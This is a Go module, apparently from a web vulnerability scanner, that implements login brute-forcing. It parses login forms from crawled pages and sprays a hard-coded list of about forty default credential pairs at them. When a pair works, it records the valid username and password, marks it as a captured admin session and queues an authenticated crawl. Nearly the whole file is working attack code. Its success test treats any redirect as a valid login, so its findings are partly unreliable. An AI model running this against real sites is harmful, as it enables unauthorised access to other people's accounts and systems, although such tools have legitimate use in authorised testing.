package hacker

import (
	"context"
	"fmt"
	"strings"

	"github.com/NICE-DEV226/nice-Scan/internal/transport"
	"github.com/NICE-DEV226/nice-Scan/internal/types"
)

type LoginBruteAction struct{}

func (a *LoginBruteAction) Metadata() ActionMetadata {
	return ActionMetadata{
		Name:        "Login Bruteforce",
		Description: "Discover login forms and spray common credentials",
		Priority:    40,
		Requires:    []string{"has_login"},
		Provides:    []string{"has_credentials"},
	}
}

var commonCreds = [][2]string{
	{"admin", "admin"}, {"admin", "password"}, {"admin", "123456"},
	{"admin", "admin123"}, {"admin", "welcome"}, {"admin", "password123"},
	{"admin", "root"}, {"admin", "test"}, {"admin", "letmein"},
	{"user", "user"}, {"user", "password"}, {"user", "123456"},
	{"root", "root"}, {"root", "toor"}, {"root", "admin"},
	{"test", "test"}, {"test", "password"}, {"test", "123456"},
	{"guest", "guest"}, {"admin", "Passw0rd!"},
	{"administrator", "administrator"}, {"administrator", "admin"},
	{"support", "support"}, {"info", "info"},
	{"admin", "admin12345"}, {"admin", "changeme"},
	{"admin", "nimda"}, {"admin", "P@ssw0rd"},
	{"admin", "secret"}, {"tomcat", "tomcat"},
	{"admin", "s3cr3t"}, {"admin", "p@ssw0rd"},
	{"oracle", "oracle"}, {"postgres", "postgres"},
	{"sa", "sa"}, {"sa", "password"},
	{"user", "pass"}, {"admin", "default"},
	{"manager", "manager"}, {"demo", "demo"},
}

func (a *LoginBruteAction) Execute(ctx context.Context, target string, kb *Knowledge, client *transport.Client) ActionResult {
	pages := kb.GetPages()
	var findings []Finding
	var spawned []Action

	for _, page := range pages {
		if page.Forms == 0 {
			continue
		}

		resp, err := client.Do(ctx, &types.Request{
			Method: "GET",
			URL:    page.URL,
		})
		if err != nil {
			continue
		}

		body := string(resp.Body)
		formAction, formFields := extractLoginForm(body)
		if formAction == "" || len(formFields) < 1 {
			continue
		}

		actionURL := resolveURL(formAction, page.URL)

		for _, cred := range commonCreds {
			select {
			case <-ctx.Done():
				return ActionResult{Findings: findings, Actions: spawned}
			default:
			}

			formData := buildFormData(formFields, cred[0], cred[1])
			loginResp, err := client.Do(ctx, &types.Request{
				Method:  "POST",
				URL:     actionURL,
				Headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded"},
				Body:    []byte(formData),
			})
			if err != nil {
				continue
			}

			if isLoginSuccess(loginResp) {
				kb.AddCredential(Credential{
					Username: cred[0],
					Password: cred[1],
					Source:   page.URL,
					Valid:    true,
				})

				findings = append(findings, Finding{
					Type:        "login_valid",
					Name:        fmt.Sprintf("Valid credentials: %s:%s", cred[0], cred[1]),
					Severity:    SevCritical,
					Description: fmt.Sprintf("Login successful at %s", actionURL),
					Evidence:    fmt.Sprintf("%s:%s → %d", cred[0], cred[1], loginResp.StatusCode),
				})

				spawned = append(spawned, &PostLoginCrawlAction{
					username:   cred[0],
					password:   cred[1],
					loginURL:   actionURL,
					formFields: formFields,
				})
				break
			}
		}
	}

	if len(findings) == 0 {
		pagesWithForms := 0
		for _, p := range pages {
			if p.Forms > 0 {
				pagesWithForms++
			}
		}
		findings = append(findings, Finding{
			Type:        "login_brute_complete",
			Name:        fmt.Sprintf("Login bruteforce complete — %d forms tested, no valid creds", pagesWithForms),
			Severity:    SevInfo,
			Description: "Tested " + fmt.Sprintf("%d credentials against %d forms", len(commonCreds), pagesWithForms),
		})
	}

	return ActionResult{Findings: findings, Actions: spawned}
}

type PostLoginAction struct {
	username string
	password string
}

func (a *PostLoginAction) Metadata() ActionMetadata {
	return ActionMetadata{
		Name:        "Post-Logon Recon",
		Description: "Explore authenticated area with valid session",
		Priority:    41,
		Requires:    []string{},
		Provides:    []string{"has_admin_session"},
	}
}

func (a *PostLoginAction) Execute(ctx context.Context, target string, kb *Knowledge, client *transport.Client) ActionResult {
	kb.AddCapability(Capability{
		Name:   "has_admin_session",
		Target: target,
		Details: map[string]string{
			"username": a.username,
			"password": a.password,
		},
	})
	return ActionResult{
		Findings: []Finding{
			{
				Type:        "post_login_session",
				Name:        "Authenticated session captured",
				Severity:    SevHigh,
				Description: fmt.Sprintf("Logged in as %s — session ready for authenticated scanning", a.username),
			},
		},
	}
}

func extractLoginForm(body string) (action string, fields []string) {
	lowBody := strings.ToLower(body)
	for i := 0; i < len(lowBody); {
		idx := strings.Index(lowBody[i:], "<form")
		if idx == -1 {
			break
		}
		formStart := i + idx
		closeTag := strings.IndexByte(body[formStart:], '>')
		if closeTag == -1 {
			break
		}

		formTag := body[formStart : formStart+closeTag+1]
		formLow := strings.ToLower(formTag)

		if strings.Contains(formLow, "password") || strings.Contains(formLow, "login") || strings.Contains(formLow, "signin") {
			action = extractAttribute(formTag, "action")
			fields = extractFormFields(body[formStart+closeTag+1:])
			return action, fields
		}

		formContent := body[formStart+closeTag+1:]
		endForm := strings.Index(strings.ToLower(formContent), "</form>")
		if endForm == -1 {
			break
		}

		if strings.Contains(strings.ToLower(formContent[:endForm]), "password") {
			action = extractAttribute(formTag, "action")
			fields = extractFormFields(formContent[:endForm])
			return action, fields
		}

		i = formStart + len(formTag) + endForm + 7
	}
	return "", nil
}

func extractFormFields(content string) []string {
	var fields []string
	lowContent := strings.ToLower(content)
	for i := 0; i < len(lowContent); {
		idx := strings.Index(lowContent[i:], "<input")
		if idx == -1 {
			break
		}
		inputStart := i + idx
		closeTag := strings.IndexByte(content[inputStart:], '>')
		if closeTag == -1 {
			break
		}
		inputTag := content[inputStart : inputStart+closeTag+1]
		inputLow := strings.ToLower(inputTag)

		if !strings.Contains(inputLow, "type=\"submit\"") && !strings.Contains(inputLow, "type=submit") {
			name := extractAttribute(inputTag, "name")
			if name != "" {
				fields = append(fields, name)
			}
		}
		i = inputStart + closeTag + 1
	}
	return fields
}

func extractAttribute(tag, attr string) string {
	attrLow := strings.ToLower(attr)
	tagLow := strings.ToLower(tag)
	attrIdx := strings.Index(tagLow, attrLow+"=")
	if attrIdx == -1 {
		return ""
	}
	valStart := attrIdx + len(attrLow) + 1
	if valStart >= len(tag) {
		return ""
	}
	quote := tag[valStart]
	if quote == '"' || quote == '\'' {
		end := strings.IndexByte(tag[valStart+1:], byte(quote))
		if end == -1 {
			return ""
		}
		return tag[valStart+1 : valStart+1+end]
	}
	end := strings.IndexAny(tag[valStart:], " >")
	if end == -1 {
		return tag[valStart:]
	}
	return tag[valStart : valStart+end]
}

func buildFormData(fields []string, username, password string) string {
	var parts []string
	for _, f := range fields {
		fLow := strings.ToLower(f)
		if strings.Contains(fLow, "user") || strings.Contains(fLow, "email") || strings.Contains(fLow, "login") || strings.Contains(fLow, "name") {
			parts = append(parts, f+"="+strings.ReplaceAll(username, " ", "+"))
		} else if strings.Contains(fLow, "pass") || strings.Contains(fLow, "pwd") {
			parts = append(parts, f+"="+strings.ReplaceAll(password, " ", "+"))
		} else {
			parts = append(parts, f+"=test")
		}
	}
	return strings.Join(parts, "&")
}

func isLoginSuccess(resp *types.Response) bool {
	if resp.StatusCode == 302 || resp.StatusCode == 301 {
		return true
	}
	if resp.StatusCode == 200 && len(resp.Body) > 0 {
		lowBody := strings.ToLower(string(resp.Body))
		successWords := []string{"dashboard", "welcome", "logout", "profile", "my account"}
		failWords := []string{"invalid", "incorrect", "failed", "error", "wrong"}

		hasSuccess := false
		for _, w := range successWords {
			if strings.Contains(lowBody, w) {
				hasSuccess = true
				break
			}
		}
		hasFail := false
		for _, w := range failWords {
			if strings.Contains(lowBody, w) {
				hasFail = true
				break
			}
		}
		return hasSuccess && !hasFail
	}
	return false
}
